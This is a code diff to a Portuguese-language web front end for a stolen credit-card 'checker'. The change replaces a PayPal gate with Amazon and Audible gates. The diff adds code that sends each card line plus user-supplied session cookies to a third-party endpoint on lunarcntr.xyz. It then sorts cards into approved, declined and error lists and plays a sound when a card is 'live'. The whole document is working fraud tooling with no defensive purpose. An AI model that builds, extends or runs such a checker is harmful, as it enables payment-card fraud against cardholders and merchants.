@@ -73,7 +73,9 @@
       <div class="flex flex-col md:flex-row mt-2 gap-4">
         <select
           class="w-full md:w-1/4 h-12 h-12 bg-[#0a0a0a] border border-[#2c2c2c] rounded-lg opacity-60 drop-shadow-xl hover:opacity-80 hover:drop-shadow-2xl duration-300 ease-in text-white text-sm rounded-lg p-2.5 font-montserrat">
-          <option selected value="PP">Paypal</option>
+          <option value="BR">Amazon BR</option>
+          <option value="IT">Amazon IT</option>
+          <option selected value="US">Amazon US</option>
         </select>
         <select v-model="threads"
           class="w-full md:w-1/4 h-12 bg-[#0a0a0a] border border-[#2c2c2c] rounded-lg opacity-60 drop-shadow-xl hover:opacity-80 hover:drop-shadow-2xl duration-300 ease-in text-white text-sm rounded-lg p-2.5 font-montserrat">
@@ -521,14 +523,22 @@ async function verificarCartoes() {
     return;
   }
 
+  if (!cookies.value.trim()) {
+    exibirNotificacao('Erro', 'Insira os cookies necessários.', 'error');
+    return;
+  }
+
   exibirNotificacao('Checker iniciado', 'O checker foi iniciado com sucesso, verifique os resultados.', 'success');
 
   isRunning.value = true;
   isPaused.value = false;
 
   const headers = new Headers({
-    'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
-    'Accept': '*/*',
+    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+    'accept': '*/*',
+    'origin': 'https://lunarcntr.xyz',
+    'referer': 'https://lunarcntr.xyz/nopsetted2/',
+    'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
   });
 
   let linhas = lista.value.trim().split('\n');
@@ -555,29 +565,40 @@ async function verificarCartoes() {
     await Promise.all(
       lote.map(async (linha) => {
         try {
-          const response = await fetch(`https://lunarcntr.xyz/api/apipaypal.php?lista=${linha}`);
+          const response = await fetch('https://lunarcntr.xyz/nopsetted2/checkers/free/audible/api.php', {
+            method: 'POST',
+            mode: 'cors',
+            headers: headers,
+            body: new URLSearchParams({
+              lista: linha,
+              cookie: cookies.value,
+            }),
+          });
 
           if (!response.ok) {
             erros.value.push(`${linha} ➔ Erro na requisição`);
             return;
           }
 
-          const data = await response.json();
+          const text = await response.text();
+          const banco = extrairBancoDaResposta(text);
 
-          // Verifica o status retornado pela API
-          if (data.status === 'Aprovada') {
-            aprovados.value.push(`${linha} ➔ ${data.bin_details} ➔ ${data.message}`);
+          // Verifica o conteúdo da resposta para determinar o status
+          if (text.includes('badge-warning')) {
+            erros.value.push(`${linha} ➔ ${banco}`);
+          } else if (text.includes('badge-danger')) {
+            recusados.value.push(`${linha} ➔ ${banco}`);
+          } else if (text.includes('badge-success')) {
+            aprovados.value.push(`${linha} ➔ ${banco}`);
             if (live) {
               live.currentTime = 0;
               live.play();
             }
-          } else if (data.status === 'Reprovada') {
-            recusados.value.push(`${linha} ➔ ${data.bin_details} ➔ ${data.message}`);
           } else {
-            erros.value.push(`${linha} ➔ ${data.bin_details} ➔ ${data.message || 'Sem mensagem'}`);
+            erros.value.push(`${linha} ➔ Resposta inesperada`);
           }
         } catch (err) {
-          erros.value.push(`${linha} ➔ Ocorreu um erro ➔ ${err.message}`);
+          erros.value.push(`${linha} ➔ Ocorreu um erro: ${err.message}`);
         }
       })
     );
